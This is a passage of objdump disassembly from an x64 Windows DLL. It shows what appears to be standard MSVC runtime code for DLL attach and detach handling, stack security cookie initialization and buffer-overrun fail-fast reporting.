   180003c18:	e9 0f 00 00 00       	jmp    0x180003c2c
   180003c1d:	4d 85 c0             	test   %r8,%r8
   180003c20:	0f 95 c1             	setne  %cl
   180003c23:	48 83 c4 28          	add    $0x28,%rsp
   180003c27:	e9 14 01 00 00       	jmp    0x180003d40
   180003c2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003c31:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003c36:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180003c3b:	41 56                	push   %r14
   180003c3d:	48 83 ec 20          	sub    $0x20,%rsp
   180003c41:	48 8b f2             	mov    %rdx,%rsi
   180003c44:	4c 8b f1             	mov    %rcx,%r14
   180003c47:	33 c9                	xor    %ecx,%ecx
   180003c49:	e8 3e 08 00 00       	call   0x18000448c
   180003c4e:	84 c0                	test   %al,%al
   180003c50:	75 07                	jne    0x180003c59
   180003c52:	33 c0                	xor    %eax,%eax
   180003c54:	e9 d0 00 00 00       	jmp    0x180003d29
   180003c59:	e8 be 06 00 00       	call   0x18000431c
   180003c5e:	8a d8                	mov    %al,%bl
   180003c60:	88 44 24 40          	mov    %al,0x40(%rsp)
   180003c64:	40 b7 01             	mov    $0x1,%dil
   180003c67:	83 3d aa cc 01 00 00 	cmpl   $0x0,0x1ccaa(%rip)        # 0x180020918
   180003c6e:	74 0a                	je     0x180003c7a
   180003c70:	b9 07 00 00 00       	mov    $0x7,%ecx
   180003c75:	e8 3a 0a 00 00       	call   0x1800046b4
   180003c7a:	c7 05 94 cc 01 00 01 	movl   $0x1,0x1cc94(%rip)        # 0x180020918
   180003c81:	00 00 00 
   180003c84:	e8 03 07 00 00       	call   0x18000438c
   180003c89:	84 c0                	test   %al,%al
   180003c8b:	74 4f                	je     0x180003cdc
   180003c8d:	e8 6e 0b 00 00       	call   0x180004800
   180003c92:	e8 45 06 00 00       	call   0x1800042dc
   180003c97:	e8 64 06 00 00       	call   0x180004300
   180003c9c:	48 8d 15 55 07 01 00 	lea    0x10755(%rip),%rdx        # 0x1800143f8
   180003ca3:	48 8d 0d 2e 07 01 00 	lea    0x1072e(%rip),%rcx        # 0x1800143d8
   180003caa:	e8 6d 44 00 00       	call   0x18000811c
   180003caf:	85 c0                	test   %eax,%eax
   180003cb1:	75 29                	jne    0x180003cdc
   180003cb3:	e8 a0 06 00 00       	call   0x180004358
   180003cb8:	84 c0                	test   %al,%al
   180003cba:	74 20                	je     0x180003cdc
   180003cbc:	48 8d 15 0d 07 01 00 	lea    0x1070d(%rip),%rdx        # 0x1800143d0
   180003cc3:	48 8d 0d fe 06 01 00 	lea    0x106fe(%rip),%rcx        # 0x1800143c8
   180003cca:	e8 e9 43 00 00       	call   0x1800080b8
   180003ccf:	c7 05 3f cc 01 00 02 	movl   $0x2,0x1cc3f(%rip)        # 0x180020918
   180003cd6:	00 00 00 
   180003cd9:	40 32 ff             	xor    %dil,%dil
   180003cdc:	8a cb                	mov    %bl,%cl
   180003cde:	e8 71 09 00 00       	call   0x180004654
   180003ce3:	40 84 ff             	test   %dil,%dil
   180003ce6:	0f 85 66 ff ff ff    	jne    0x180003c52
   180003cec:	e8 b3 09 00 00       	call   0x1800046a4
   180003cf1:	48 8b d8             	mov    %rax,%rbx
   180003cf4:	48 83 38 00          	cmpq   $0x0,(%rax)
   180003cf8:	74 24                	je     0x180003d1e
   180003cfa:	48 8b c8             	mov    %rax,%rcx
   180003cfd:	e8 b6 08 00 00       	call   0x1800045b8
   180003d02:	84 c0                	test   %al,%al
   180003d04:	74 18                	je     0x180003d1e
   180003d06:	48 8b 1b             	mov    (%rbx),%rbx
   180003d09:	48 8b cb             	mov    %rbx,%rcx
   180003d0c:	e8 87 0b 00 00       	call   0x180004898
   180003d11:	4c 8b c6             	mov    %rsi,%r8
   180003d14:	ba 02 00 00 00       	mov    $0x2,%edx
   180003d19:	49 8b ce             	mov    %r14,%rcx
   180003d1c:	ff d3                	call   *%rbx
   180003d1e:	ff 05 5c c6 01 00    	incl   0x1c65c(%rip)        # 0x180020380
   180003d24:	b8 01 00 00 00       	mov    $0x1,%eax
   180003d29:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003d2e:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180003d33:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180003d38:	48 83 c4 20          	add    $0x20,%rsp
   180003d3c:	41 5e                	pop    %r14
   180003d3e:	c3                   	ret
   180003d3f:	cc                   	int3
   180003d40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003d45:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003d4a:	57                   	push   %rdi
   180003d4b:	48 83 ec 20          	sub    $0x20,%rsp
   180003d4f:	40 8a f1             	mov    %cl,%sil
   180003d52:	8b 05 28 c6 01 00    	mov    0x1c628(%rip),%eax        # 0x180020380
   180003d58:	33 db                	xor    %ebx,%ebx
   180003d5a:	85 c0                	test   %eax,%eax
   180003d5c:	7f 04                	jg     0x180003d62
   180003d5e:	33 c0                	xor    %eax,%eax
   180003d60:	eb 5a                	jmp    0x180003dbc
   180003d62:	ff c8                	dec    %eax
   180003d64:	89 05 16 c6 01 00    	mov    %eax,0x1c616(%rip)        # 0x180020380
   180003d6a:	e8 ad 05 00 00       	call   0x18000431c
   180003d6f:	40 8a f8             	mov    %al,%dil
   180003d72:	88 44 24 38          	mov    %al,0x38(%rsp)
   180003d76:	83 3d 9b cb 01 00 02 	cmpl   $0x2,0x1cb9b(%rip)        # 0x180020918
   180003d7d:	74 0a                	je     0x180003d89
   180003d7f:	b9 07 00 00 00       	mov    $0x7,%ecx
   180003d84:	e8 2b 09 00 00       	call   0x1800046b4
   180003d89:	e8 ba 06 00 00       	call   0x180004448
   180003d8e:	e8 59 05 00 00       	call   0x1800042ec
   180003d93:	e8 b4 0a 00 00       	call   0x18000484c
   180003d98:	89 1d 7a cb 01 00    	mov    %ebx,0x1cb7a(%rip)        # 0x180020918
   180003d9e:	e8 d5 06 00 00       	call   0x180004478
   180003da3:	40 8a cf             	mov    %dil,%cl
   180003da6:	e8 a9 08 00 00       	call   0x180004654
   180003dab:	33 d2                	xor    %edx,%edx
   180003dad:	40 8a ce             	mov    %sil,%cl
   180003db0:	e8 c3 08 00 00       	call   0x180004678
   180003db5:	84 c0                	test   %al,%al
   180003db7:	0f 95 c3             	setne  %bl
   180003dba:	8b c3                	mov    %ebx,%eax
   180003dbc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003dc1:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180003dc6:	48 83 c4 20          	add    $0x20,%rsp
   180003dca:	5f                   	pop    %rdi
   180003dcb:	c3                   	ret
   180003dcc:	48 8b c4             	mov    %rsp,%rax
   180003dcf:	48 89 58 20          	mov    %rbx,0x20(%rax)
   180003dd3:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180003dd7:	89 50 10             	mov    %edx,0x10(%rax)
   180003dda:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180003dde:	56                   	push   %rsi
   180003ddf:	57                   	push   %rdi
   180003de0:	41 56                	push   %r14
   180003de2:	48 83 ec 40          	sub    $0x40,%rsp
   180003de6:	49 8b f0             	mov    %r8,%rsi
   180003de9:	8b fa                	mov    %edx,%edi
   180003deb:	4c 8b f1             	mov    %rcx,%r14
   180003dee:	85 d2                	test   %edx,%edx
   180003df0:	75 0f                	jne    0x180003e01
   180003df2:	39 15 88 c5 01 00    	cmp    %edx,0x1c588(%rip)        # 0x180020380
   180003df8:	7f 07                	jg     0x180003e01
   180003dfa:	33 c0                	xor    %eax,%eax
   180003dfc:	e9 b2 00 00 00       	jmp    0x180003eb3
   180003e01:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180003e04:	83 f8 01             	cmp    $0x1,%eax
   180003e07:	77 2a                	ja     0x180003e33
   180003e09:	e8 b6 00 00 00       	call   0x180003ec4
   180003e0e:	8b d8                	mov    %eax,%ebx
   180003e10:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003e14:	85 c0                	test   %eax,%eax
   180003e16:	0f 84 8d 00 00 00    	je     0x180003ea9
   180003e1c:	4c 8b c6             	mov    %rsi,%r8
   180003e1f:	8b d7                	mov    %edi,%edx
   180003e21:	49 8b ce             	mov    %r14,%rcx
   180003e24:	e8 b3 fd ff ff       	call   0x180003bdc
   180003e29:	8b d8                	mov    %eax,%ebx
   180003e2b:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003e2f:	85 c0                	test   %eax,%eax
   180003e31:	74 76                	je     0x180003ea9
   180003e33:	4c 8b c6             	mov    %rsi,%r8
   180003e36:	8b d7                	mov    %edi,%edx
   180003e38:	49 8b ce             	mov    %r14,%rcx
   180003e3b:	e8 e0 f0 ff ff       	call   0x180002f20
   180003e40:	8b d8                	mov    %eax,%ebx
   180003e42:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003e46:	83 ff 01             	cmp    $0x1,%edi
   180003e49:	75 2b                	jne    0x180003e76
   180003e4b:	85 c0                	test   %eax,%eax
   180003e4d:	75 27                	jne    0x180003e76
   180003e4f:	4c 8b c6             	mov    %rsi,%r8
   180003e52:	33 d2                	xor    %edx,%edx
   180003e54:	49 8b ce             	mov    %r14,%rcx
   180003e57:	e8 c4 f0 ff ff       	call   0x180002f20
   180003e5c:	4c 8b c6             	mov    %rsi,%r8
   180003e5f:	33 d2                	xor    %edx,%edx
   180003e61:	49 8b ce             	mov    %r14,%rcx
   180003e64:	e8 73 fd ff ff       	call   0x180003bdc
   180003e69:	4c 8b c6             	mov    %rsi,%r8
   180003e6c:	33 d2                	xor    %edx,%edx
   180003e6e:	49 8b ce             	mov    %r14,%rcx
   180003e71:	e8 4e 00 00 00       	call   0x180003ec4
   180003e76:	85 ff                	test   %edi,%edi
   180003e78:	74 05                	je     0x180003e7f
   180003e7a:	83 ff 03             	cmp    $0x3,%edi
   180003e7d:	75 2a                	jne    0x180003ea9
   180003e7f:	4c 8b c6             	mov    %rsi,%r8
   180003e82:	8b d7                	mov    %edi,%edx
   180003e84:	49 8b ce             	mov    %r14,%rcx
   180003e87:	e8 50 fd ff ff       	call   0x180003bdc
   180003e8c:	8b d8                	mov    %eax,%ebx
   180003e8e:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003e92:	85 c0                	test   %eax,%eax
   180003e94:	74 13                	je     0x180003ea9
   180003e96:	4c 8b c6             	mov    %rsi,%r8
   180003e99:	8b d7                	mov    %edi,%edx
   180003e9b:	49 8b ce             	mov    %r14,%rcx
   180003e9e:	e8 21 00 00 00       	call   0x180003ec4
   180003ea3:	8b d8                	mov    %eax,%ebx
   180003ea5:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180003ea9:	eb 06                	jmp    0x180003eb1
   180003eab:	33 db                	xor    %ebx,%ebx
   180003ead:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180003eb1:	8b c3                	mov    %ebx,%eax
   180003eb3:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   180003eb8:	48 83 c4 40          	add    $0x40,%rsp
   180003ebc:	41 5e                	pop    %r14
   180003ebe:	5f                   	pop    %rdi
   180003ebf:	5e                   	pop    %rsi
   180003ec0:	c3                   	ret
   180003ec1:	cc                   	int3
   180003ec2:	cc                   	int3
   180003ec3:	cc                   	int3
   180003ec4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003ec9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180003ece:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003ed3:	57                   	push   %rdi
   180003ed4:	48 83 ec 20          	sub    $0x20,%rsp
   180003ed8:	48 8b 1d 61 05 01 00 	mov    0x10561(%rip),%rbx        # 0x180014440
   180003edf:	49 8b f8             	mov    %r8,%rdi
   180003ee2:	8b f2                	mov    %edx,%esi
   180003ee4:	48 8b e9             	mov    %rcx,%rbp
   180003ee7:	48 85 db             	test   %rbx,%rbx
   180003eea:	75 05                	jne    0x180003ef1
   180003eec:	8d 43 01             	lea    0x1(%rbx),%eax
   180003eef:	eb 12                	jmp    0x180003f03
   180003ef1:	48 8b cb             	mov    %rbx,%rcx
   180003ef4:	e8 9f 09 00 00       	call   0x180004898
   180003ef9:	4c 8b c7             	mov    %rdi,%r8
   180003efc:	8b d6                	mov    %esi,%edx
   180003efe:	48 8b cd             	mov    %rbp,%rcx
   180003f01:	ff d3                	call   *%rbx
   180003f03:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003f08:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180003f0d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180003f12:	48 83 c4 20          	add    $0x20,%rsp
   180003f16:	5f                   	pop    %rdi
   180003f17:	c3                   	ret
   180003f18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003f1d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003f22:	57                   	push   %rdi
   180003f23:	48 83 ec 20          	sub    $0x20,%rsp
   180003f27:	49 8b f8             	mov    %r8,%rdi
   180003f2a:	8b da                	mov    %edx,%ebx
   180003f2c:	48 8b f1             	mov    %rcx,%rsi
   180003f2f:	83 fa 01             	cmp    $0x1,%edx
   180003f32:	75 05                	jne    0x180003f39
   180003f34:	e8 f7 02 00 00       	call   0x180004230
   180003f39:	4c 8b c7             	mov    %rdi,%r8
   180003f3c:	8b d3                	mov    %ebx,%edx
   180003f3e:	48 8b ce             	mov    %rsi,%rcx
   180003f41:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003f46:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180003f4b:	48 83 c4 20          	add    $0x20,%rsp
   180003f4f:	5f                   	pop    %rdi
   180003f50:	e9 77 fe ff ff       	jmp    0x180003dcc
   180003f55:	cc                   	int3
   180003f56:	cc                   	int3
   180003f57:	cc                   	int3
   180003f58:	40 53                	rex push %rbx
   180003f5a:	48 83 ec 20          	sub    $0x20,%rsp
   180003f5e:	48 8b d9             	mov    %rcx,%rbx
   180003f61:	33 c9                	xor    %ecx,%ecx
   180003f63:	ff 15 57 02 01 00    	call   *0x10257(%rip)        # 0x1800141c0
   180003f69:	48 8b cb             	mov    %rbx,%rcx
   180003f6c:	ff 15 46 02 01 00    	call   *0x10246(%rip)        # 0x1800141b8
   180003f72:	ff 15 c0 01 01 00    	call   *0x101c0(%rip)        # 0x180014138
   180003f78:	48 8b c8             	mov    %rax,%rcx
   180003f7b:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180003f80:	48 83 c4 20          	add    $0x20,%rsp
   180003f84:	5b                   	pop    %rbx
   180003f85:	48 ff 25 3c 02 01 00 	rex.W jmp *0x1023c(%rip)        # 0x1800141c8
   180003f8c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180003f91:	48 83 ec 38          	sub    $0x38,%rsp
   180003f95:	b9 17 00 00 00       	mov    $0x17,%ecx
   180003f9a:	e8 bf e5 00 00       	call   0x18001255e
   180003f9f:	85 c0                	test   %eax,%eax
   180003fa1:	74 07                	je     0x180003faa
   180003fa3:	b9 02 00 00 00       	mov    $0x2,%ecx
   180003fa8:	cd 29                	int    $0x29
   180003faa:	48 8d 0d 7f c4 01 00 	lea    0x1c47f(%rip),%rcx        # 0x180020430
   180003fb1:	e8 ca 01 00 00       	call   0x180004180
   180003fb6:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003fbb:	48 89 05 66 c5 01 00 	mov    %rax,0x1c566(%rip)        # 0x180020528
   180003fc2:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180003fc7:	48 83 c0 08          	add    $0x8,%rax
   180003fcb:	48 89 05 f6 c4 01 00 	mov    %rax,0x1c4f6(%rip)        # 0x1800204c8
   180003fd2:	48 8b 05 4f c5 01 00 	mov    0x1c54f(%rip),%rax        # 0x180020528
   180003fd9:	48 89 05 c0 c3 01 00 	mov    %rax,0x1c3c0(%rip)        # 0x1800203a0
   180003fe0:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180003fe5:	48 89 05 c4 c4 01 00 	mov    %rax,0x1c4c4(%rip)        # 0x1800204b0
   180003fec:	c7 05 9a c3 01 00 09 	movl   $0xc0000409,0x1c39a(%rip)        # 0x180020390
   180003ff3:	04 00 c0 
   180003ff6:	c7 05 94 c3 01 00 01 	movl   $0x1,0x1c394(%rip)        # 0x180020394
   180003ffd:	00 00 00 
   180004000:	c7 05 9e c3 01 00 01 	movl   $0x1,0x1c39e(%rip)        # 0x1800203a8
   180004007:	00 00 00 
   18000400a:	b8 08 00 00 00       	mov    $0x8,%eax
   18000400f:	48 6b c0 00          	imul   $0x0,%rax,%rax
   180004013:	48 8d 0d 96 c3 01 00 	lea    0x1c396(%rip),%rcx        # 0x1800203b0
   18000401a:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   180004021:	00 
   180004022:	b8 08 00 00 00       	mov    $0x8,%eax
   180004027:	48 6b c0 00          	imul   $0x0,%rax,%rax
   18000402b:	48 8b 0d d6 af 01 00 	mov    0x1afd6(%rip),%rcx        # 0x18001f008
   180004032:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   180004037:	b8 08 00 00 00       	mov    $0x8,%eax
   18000403c:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180004040:	48 8b 0d b9 af 01 00 	mov    0x1afb9(%rip),%rcx        # 0x18001f000
   180004047:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   18000404c:	48 8d 0d f5 03 01 00 	lea    0x103f5(%rip),%rcx        # 0x180014448
   180004053:	e8 00 ff ff ff       	call   0x180003f58
   180004058:	48 83 c4 38          	add    $0x38,%rsp
   18000405c:	c3                   	ret
   18000405d:	cc                   	int3
   18000405e:	cc                   	int3
   18000405f:	cc                   	int3
   180004060:	48 83 ec 28          	sub    $0x28,%rsp
   180004064:	b9 08 00 00 00       	mov    $0x8,%ecx
   180004069:	e8 06 00 00 00       	call   0x180004074
   18000406e:	48 83 c4 28          	add    $0x28,%rsp
   180004072:	c3                   	ret
   180004073:	cc                   	int3
   180004074:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180004078:	48 83 ec 28          	sub    $0x28,%rsp
   18000407c:	b9 17 00 00 00       	mov    $0x17,%ecx
   180004081:	e8 d8 e4 00 00       	call   0x18001255e
   180004086:	85 c0                	test   %eax,%eax
   180004088:	74 08                	je     0x180004092
   18000408a:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000408e:	8b c8                	mov    %eax,%ecx
   180004090:	cd 29                	int    $0x29
   180004092:	48 8d 0d 97 c3 01 00 	lea    0x1c397(%rip),%rcx        # 0x180020430
   180004099:	e8 72 00 00 00       	call   0x180004110
   18000409e:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1800040a3:	48 89 05 7e c4 01 00 	mov    %rax,0x1c47e(%rip)        # 0x180020528
   1800040aa:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   1800040af:	48 83 c0 08          	add    $0x8,%rax
   1800040b3:	48 89 05 0e c4 01 00 	mov    %rax,0x1c40e(%rip)        # 0x1800204c8
   1800040ba:	48 8b 05 67 c4 01 00 	mov    0x1c467(%rip),%rax        # 0x180020528
   1800040c1:	48 89 05 d8 c2 01 00 	mov    %rax,0x1c2d8(%rip)        # 0x1800203a0
   1800040c8:	c7 05 be c2 01 00 09 	movl   $0xc0000409,0x1c2be(%rip)        # 0x180020390
   1800040cf:	04 00 c0 
   1800040d2:	c7 05 b8 c2 01 00 01 	movl   $0x1,0x1c2b8(%rip)        # 0x180020394
   1800040d9:	00 00 00 
   1800040dc:	c7 05 c2 c2 01 00 01 	movl   $0x1,0x1c2c2(%rip)        # 0x1800203a8
   1800040e3:	00 00 00 
   1800040e6:	b8 08 00 00 00       	mov    $0x8,%eax
   1800040eb:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800040ef:	48 8d 0d ba c2 01 00 	lea    0x1c2ba(%rip),%rcx        # 0x1800203b0
   1800040f6:	8b 54 24 30          	mov    0x30(%rsp),%edx
   1800040fa:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1800040fe:	48 8d 0d 43 03 01 00 	lea    0x10343(%rip),%rcx        # 0x180014448
   180004105:	e8 4e fe ff ff       	call   0x180003f58
   18000410a:	48 83 c4 28          	add    $0x28,%rsp
   18000410e:	c3                   	ret
   18000410f:	cc                   	int3
   180004110:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180004115:	57                   	push   %rdi
   180004116:	48 83 ec 40          	sub    $0x40,%rsp
   18000411a:	48 8b d9             	mov    %rcx,%rbx
   18000411d:	ff 15 7d 00 01 00    	call   *0x1007d(%rip)        # 0x1800141a0
   180004123:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   18000412a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   18000412f:	48 8b cf             	mov    %rdi,%rcx
   180004132:	45 33 c0             	xor    %r8d,%r8d
   180004135:	ff 15 6d 00 01 00    	call   *0x1006d(%rip)        # 0x1800141a8
   18000413b:	48 85 c0             	test   %rax,%rax
   18000413e:	74 32                	je     0x180004172
   180004140:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180004146:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   18000414b:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   180004150:	4c 8b c8             	mov    %rax,%r9
   180004153:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180004158:	4c 8b c7             	mov    %rdi,%r8
   18000415b:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   180004160:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180004165:	33 c9                	xor    %ecx,%ecx
   180004167:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000416c:	ff 15 3e 00 01 00    	call   *0x1003e(%rip)        # 0x1800141b0
   180004172:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   180004177:	48 83 c4 40          	add    $0x40,%rsp
   18000417b:	5f                   	pop    %rdi
   18000417c:	c3                   	ret
   18000417d:	cc                   	int3
   18000417e:	cc                   	int3
   18000417f:	cc                   	int3
   180004180:	40 53                	rex push %rbx
   180004182:	56                   	push   %rsi
   180004183:	57                   	push   %rdi
   180004184:	48 83 ec 40          	sub    $0x40,%rsp
   180004188:	48 8b d9             	mov    %rcx,%rbx
   18000418b:	ff 15 0f 00 01 00    	call   *0x1000f(%rip)        # 0x1800141a0
   180004191:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180004198:	33 ff                	xor    %edi,%edi
   18000419a:	45 33 c0             	xor    %r8d,%r8d
   18000419d:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800041a2:	48 8b ce             	mov    %rsi,%rcx
   1800041a5:	ff 15 fd ff 00 00    	call   *0xfffd(%rip)        # 0x1800141a8
   1800041ab:	48 85 c0             	test   %rax,%rax
   1800041ae:	74 39                	je     0x1800041e9
   1800041b0:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1800041b6:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   1800041bb:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1800041c0:	4c 8b c8             	mov    %rax,%r9
   1800041c3:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1800041c8:	4c 8b c6             	mov    %rsi,%r8
   1800041cb:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1800041d0:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1800041d5:	33 c9                	xor    %ecx,%ecx
   1800041d7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1800041dc:	ff 15 ce ff 00 00    	call   *0xffce(%rip)        # 0x1800141b0
   1800041e2:	ff c7                	inc    %edi
   1800041e4:	83 ff 02             	cmp    $0x2,%edi
   1800041e7:	7c b1                	jl     0x18000419a
   1800041e9:	48 83 c4 40          	add    $0x40,%rsp
   1800041ed:	5f                   	pop    %rdi
   1800041ee:	5e                   	pop    %rsi
   1800041ef:	5b                   	pop    %rbx
   1800041f0:	c3                   	ret
   1800041f1:	cc                   	int3
   1800041f2:	cc                   	int3
   1800041f3:	cc                   	int3
   1800041f4:	40 53                	rex push %rbx
   1800041f6:	48 83 ec 20          	sub    $0x20,%rsp
   1800041fa:	48 8b d9             	mov    %rcx,%rbx
   1800041fd:	eb 0f                	jmp    0x18000420e
   1800041ff:	48 8b cb             	mov    %rbx,%rcx
   180004202:	e8 5d 3f 00 00       	call   0x180008164
   180004207:	85 c0                	test   %eax,%eax
   180004209:	74 13                	je     0x18000421e
   18000420b:	48 8b cb             	mov    %rbx,%rcx
   18000420e:	e8 ad 3a 00 00       	call   0x180007cc0
   180004213:	48 85 c0             	test   %rax,%rax
   180004216:	74 e7                	je     0x1800041ff
   180004218:	48 83 c4 20          	add    $0x20,%rsp
   18000421c:	5b                   	pop    %rbx
   18000421d:	c3                   	ret
   18000421e:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   180004222:	75 06                	jne    0x18000422a
   180004224:	e8 e7 07 00 00       	call   0x180004a10
   180004229:	cc                   	int3
   18000422a:	e8 c1 07 00 00       	call   0x1800049f0
   18000422f:	cc                   	int3
   180004230:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180004235:	55                   	push   %rbp
   180004236:	48 8b ec             	mov    %rsp,%rbp
   180004239:	48 83 ec 20          	sub    $0x20,%rsp
   18000423d:	48 8b 05 c4 ad 01 00 	mov    0x1adc4(%rip),%rax        # 0x18001f008
   180004244:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   18000424b:	2b 00 00 
   18000424e:	48 3b c3             	cmp    %rbx,%rax
   180004251:	75 74                	jne    0x1800042c7
   180004253:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   180004258:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   18000425c:	ff 15 86 ff 00 00    	call   *0xff86(%rip)        # 0x1800141e8
   180004262:	48 8b 45 18          	mov    0x18(%rbp),%rax
   180004266:	48 89 45 10          	mov    %rax,0x10(%rbp)
   18000426a:	ff 15 70 ff 00 00    	call   *0xff70(%rip)        # 0x1800141e0
   180004270:	8b c0                	mov    %eax,%eax
   180004272:	48 31 45 10          	xor    %rax,0x10(%rbp)
   180004276:	ff 15 5c fe 00 00    	call   *0xfe5c(%rip)        # 0x1800140d8
   18000427c:	8b c0                	mov    %eax,%eax
   18000427e:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   180004282:	48 31 45 10          	xor    %rax,0x10(%rbp)
   180004286:	ff 15 4c ff 00 00    	call   *0xff4c(%rip)        # 0x1800141d8
   18000428c:	8b 45 20             	mov    0x20(%rbp),%eax
   18000428f:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180004293:	48 c1 e0 20          	shl    $0x20,%rax
   180004297:	48 33 45 20          	xor    0x20(%rbp),%rax
   18000429b:	48 33 45 10          	xor    0x10(%rbp),%rax
   18000429f:	48 33 c1             	xor    %rcx,%rax
   1800042a2:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   1800042a9:	ff 00 00 
   1800042ac:	48 23 c1             	and    %rcx,%rax
   1800042af:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   1800042b6:	2b 00 00 
   1800042b9:	48 3b c3             	cmp    %rbx,%rax
   1800042bc:	48 0f 44 c1          	cmove  %rcx,%rax
   1800042c0:	48 89 05 41 ad 01 00 	mov    %rax,0x1ad41(%rip)        # 0x18001f008
   1800042c7:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   1800042cc:	48 f7 d0             	not    %rax
   1800042cf:	48 89 05 2a ad 01 00 	mov    %rax,0x1ad2a(%rip)        # 0x18001f000
   1800042d6:	48 83 c4 20          	add    $0x20,%rsp
   1800042da:	5d                   	pop    %rbp
   1800042db:	c3                   	ret
   1800042dc:	48 8d 0d 1d c6 01 00 	lea    0x1c61d(%rip),%rcx        # 0x180020900
   1800042e3:	48 ff 25 06 ff 00 00 	rex.W jmp *0xff06(%rip)        # 0x1800141f0
   1800042ea:	cc                   	int3
   1800042eb:	cc                   	int3
   1800042ec:	48 8d 0d 0d c6 01 00 	lea    0x1c60d(%rip),%rcx        # 0x180020900
   1800042f3:	e9 08 0f 00 00       	jmp    0x180005200
   1800042f8:	48 8d 05 11 c6 01 00 	lea    0x1c611(%rip),%rax        # 0x180020910
   1800042ff:	c3                   	ret
   180004300:	48 83 ec 28          	sub    $0x28,%rsp
   180004304:	e8 f7 cc ff ff       	call   0x180001000
   180004309:	48 83 08 04          	orq    $0x4,(%rax)
   18000430d:	e8 e6 ff ff ff       	call   0x1800042f8
   180004312:	48 83 08 02          	orq    $0x2,(%rax)
   180004316:	48 83 c4 28          	add    $0x28,%rsp
   18000431a:	c3                   	ret
   18000431b:	cc                   	int3
   18000431c:	48 83 ec 28          	sub    $0x28,%rsp
   180004320:	e8 e3 08 00 00       	call   0x180004c08
   180004325:	85 c0                	test   %eax,%eax
   180004327:	74 21                	je     0x18000434a
   180004329:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   180004330:	00 00 
   180004332:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180004336:	eb 05                	jmp    0x18000433d
   180004338:	48 3b c8             	cmp    %rax,%rcx
   18000433b:	74 14                	je     0x180004351
   18000433d:	33 c0                	xor    %eax,%eax
   18000433f:	f0 48 0f b1 0d d8 c5 	lock cmpxchg %rcx,0x1c5d8(%rip)        # 0x180020920
   180004346:	01 00 
